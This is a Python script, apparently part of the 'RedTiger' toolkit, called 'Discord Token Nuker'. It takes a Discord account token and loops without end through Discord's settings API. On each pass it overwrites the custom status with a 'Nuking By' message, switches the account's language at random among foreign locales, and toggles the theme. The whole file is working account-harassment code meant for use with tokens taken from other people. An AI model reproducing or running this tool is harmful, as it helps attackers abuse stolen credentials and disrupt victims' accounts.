# Copyright (c) RedTiger 
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import requests
    import time
    import requests
    import time
    from itertools import cycle
    import random
except Exception as e:
   ErrorModule(e)
   

Title("Discord Token Nuker")

try:
    Slow(discord_banner)
    token = Choice1TokenDiscord()
    custom_status_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Custom Status -> {reset}")

    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if response.status_code != 200:
        ErrorToken()

    default_status = f"Nuking By {github_tool}"
    custom_status = f"{custom_status_input} | RedTiger"
        
    modes = cycle(["light", "dark"])

    while True:

        CustomStatus_default = {"custom_status": {"text": default_status}}
        try:
            r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_default)
            print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Status: {white}Changed{red} Status Discord: {white}{default_status}{red}")
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Status: {white}Error {e}{red} Status Discord: {white}{default_status}{red}")

        for _ in range(5):
            try:
                random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                setting = {'locale': random_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Status: {white}Changed{red} Language: {white}{random_language}{red}")
            except:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Status:  {white}Error{red}  Language: {white}{random_language}{red}")
        
            try:
                theme = next(modes)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Status: {white}Changed{red} Theme: {white}{theme}{red}")
            except:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Status:  {white}Error{red}  Theme: {white}{theme}{red}")
            time.sleep(0.5)


        CustomStatus_custom = {"custom_status": {"text": custom_status}}
        try:
            r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_custom)
            print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Status: {white}Changed{red} Status Discord: {white}{custom_status}{red}")
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Status: {white}Changed{red} Status Discord: {white}{custom_status}{red}")
        
        for _ in range(5):
            try:
                random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                setting = {'locale': random_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Status: {white}Changed{red} Language: {white}{random_language}{red}")
            except:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Status:  {white}Error{red}  Language: {white}{random_language}{red}")
        
            try:
                theme = next(modes)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Status: {white}Changed{red} Theme: {white}{theme}{red}")
            except:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Status:  {white}Error{red}  Theme: {white}{theme}{red}")
            time.sleep(0.5)
except Exception as e:
    Error(e)